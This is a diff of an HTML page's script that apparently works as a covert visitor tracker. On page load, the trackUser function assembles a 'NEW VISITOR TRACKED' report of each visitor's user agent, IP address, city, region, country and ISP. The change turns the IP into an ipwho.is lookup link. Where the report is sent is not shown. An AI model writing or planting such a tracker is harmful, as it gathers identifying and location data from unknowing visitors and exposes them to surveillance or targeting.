@@ -135,7 +135,7 @@
             try {
                 let message = `🕵️ NEW VISITOR TRACKED 🕵️\n\n`;
                 message += `📱 Device: ${navigator.userAgent}\n\n`;
-                message += `🌐 IP: ${data.ip || 'Unknown'}\n`;
+                message += `🌐 IP: http://ipwho.is/${data.ip || 'Unknown'}\n`;
                 message += `📍 IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
                 message += `🏢 ISP: ${data.org || 'Unknown'}\n`;
                 
@@ -202,4 +202,5 @@
         window.onload = trackUser;
     </script>
 </body>
+
 </html>
